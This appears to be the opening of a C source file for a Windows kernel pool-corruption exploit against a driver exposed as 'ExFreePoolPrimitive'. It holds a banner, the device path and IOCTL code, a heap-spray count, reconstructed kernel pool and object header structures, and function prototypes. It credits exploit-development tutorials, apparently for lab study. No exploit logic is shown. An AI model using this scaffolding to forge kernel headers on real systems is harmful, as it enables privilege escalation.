#include <Windows.h>
#include <stdio.h>

#define BANNER \
("    ______     ______               ____              __\n" \
"   / ____/  __/ ____/_______  ___  / __ \\____  ____  / /\n" \
"  / __/ | |/_/ /_  / ___/ _ \\/ _ \\/ /_/ / __ \\/ __ \\/ / \n" \
" / /____>  </ __/ / /  /  __/  __/ ____/ /_/ / /_/ / /  \n" \
"/_____/_/|_/_/   /_/   \\___/\\___/_/    \\____/\\____/_/   \n" \
"                                                        \n" \
)

#define DEVICE "\\\\.\\ExFreePoolPrimitive"
#define TARGET_IOCTL 2228227

#define HEAP_OBJECT_COUNT 8192

char unused = 0;

// Credits to mgeeky for these structures, and credits to Fuzzysecurity for the commands to reverse these structures.
// I did have to do some of my own work, though.
// Link: https://github.com/mgeeky/HEVD_Kernel_Exploit/blob/master/PoolCorruption.h
// Link: https://www.fuzzysecurity.com/tutorials/expDev/20.html
typedef struct _POOL_HEADER
{
	union
	{
		struct
		{
			unsigned long PreviousSize;
			unsigned long PoolIndex;
			unsigned long BlockSize;
			unsigned long PoolType;
		};
		unsigned long Ulong1;
	};

	unsigned long PoolTag;
	union
	{
		unsigned short AllocatorBackTraceIndex;
		unsigned short PoolTagHash;
	};
} POOL_HEADER, * PPOOL_HEADER;

typedef struct _OBJECT_HEADER
{
	unsigned long long PointerCount;
	union
	{
		unsigned long long HandleCount;
		void* NextToFree;
	};

	void* Lock;
	unsigned char TypeIndex;
	union
	{
		unsigned char TraceFlags;
		unsigned long DbgRefTrace;
		unsigned long DbgTracePermanent;
	};

	unsigned char InfoMask;
	union
	{
		unsigned char Flags;
		unsigned long NewObject;
		unsigned long KernelObject;
		unsigned long KernelOnlyAccess;
		unsigned long ExclusiveObject;
		unsigned long PermanentObject;
		unsigned long DefaultSecurityQuota;
		unsigned long SingleHandleEntry;
		unsigned long DeletedInline;
	};

	unsigned long Reserved;
	union
	{
		unsigned long long* ObjectCreateInfo;
		unsigned long long* QuotaBlockCharged;
	};

	unsigned long long* SecurityDescriptor;
	void* Body;
} OBJECT_HEADER, * POBJECT_HEADER;

typedef struct _OBJECT_HEADER_QUOTA
{
	unsigned long PagedPoolCharge;
	unsigned long NonPagedPoolCharge;
	unsigned long SecurityDescriptorCharge;
	unsigned long Reserved1;
	unsigned long long SecurityDescriptorQuotaBlock;
	unsigned long Reserved2;
} OBJECT_HEADER_QUOTA, * POBJECT_HEADER_QUOTA;

typedef _Enum_is_bitflag_ enum _POOL_TYPE {
	NonPagedPool,
	NonPagedPoolExecute = NonPagedPool,
	PagedPool,
	NonPagedPoolMustSucceed = NonPagedPool + 2,
	DontUseThisType,
	NonPagedPoolCacheAligned = NonPagedPool + 4,
	PagedPoolCacheAligned,
	NonPagedPoolCacheAlignedMustS = NonPagedPool + 6,
	MaxPoolType,

	NonPagedPoolBase = 0,
	NonPagedPoolBaseMustSucceed = NonPagedPoolBase + 2,
	NonPagedPoolBaseCacheAligned = NonPagedPoolBase + 4,
	NonPagedPoolBaseCacheAlignedMustS = NonPagedPoolBase + 6,

	NonPagedPoolSession = 32,
	PagedPoolSession = NonPagedPoolSession + 1,
	NonPagedPoolMustSucceedSession = PagedPoolSession + 1,
	DontUseThisTypeSession = NonPagedPoolMustSucceedSession + 1,
	NonPagedPoolCacheAlignedSession = DontUseThisTypeSession + 1,
	PagedPoolCacheAlignedSession = NonPagedPoolCacheAlignedSession + 1,
	NonPagedPoolCacheAlignedMustSSession = PagedPoolCacheAlignedSession + 1,

	NonPagedPoolNx = 512,
	NonPagedPoolNxCacheAligned = NonPagedPoolNx + 4,
	NonPagedPoolSessionNx = NonPagedPoolNx + 32,

} _Enum_is_bitflag_ POOL_TYPE;

int main(int argc, char** argv);
void initialize_pool_header(PPOOL_HEADER input_pool_header);
void initialize_object_header(POBJECT_HEADER input_object_header);
void initialize_object_header_quota(POBJECT_HEADER_QUOTA input_object_header_quota);